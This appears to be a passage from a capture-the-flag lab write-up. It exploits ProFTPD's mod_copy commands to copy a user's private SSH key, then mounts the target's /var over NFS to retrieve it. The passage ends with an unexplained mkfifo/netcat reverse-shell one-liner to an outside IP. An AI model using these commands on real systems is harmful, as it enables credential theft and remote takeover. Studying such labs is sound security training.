As we need to get our hands on the id_rsa file and we see that we have the ProFTPD on the target, we need to figure out a way to get access to that file through the FTP service. To check if we have any known vulnerabilities regarding the ProFTPD using Searchsploit. We see that we have the vulnerability named File Copy. We used the searchsploit to download the exploit file using the -m option. Here, we see that we need to run two significant commands: CPFR which means Copy From, and CPTO means Copy To. Â So we can use these commands to copy the id_rsa file from its location to a place from where we can acquire it.

```python
searchsploit ProFTPD 1.3.5
searchsploit -m 36742
cat 36742.txt
```

#### Connecting to the ftp service using Netcat - 
We used netcat to connect to the FTP service on the target machine. We used the CPFR command to copy the id_rsa from the home directory of the Kenobi user. Then we used the CPTO command to provide the destination address for the id_rsa file. We transferred the file to /var directory.
```python
nc 10.10.101.175 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

## Mounting to the /var 
Now that we have successfully transferred the id_rsa into the var directory, we can mount the /var directory so that we can access the id_rsa files on our local machine. We created a directory by the name of /ignite inside the /mnt directory. Next, we used the mount command to mount the remote var directory to our local ignite folder. Moving to the ignite directory we found the id_rsa file. Changing the permissions of the id_rsa file to make it ready to connect via SSH.
```python
sudo mkdir /mnt/ignite
mount 10.10.101.175:/var /mnt/ignite
cd /mnt/ignite/tmp
ls
cp id_rsa /root
cd /root
chmod 600 id_rsa
```

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.47.177 4444 >/tmp/f
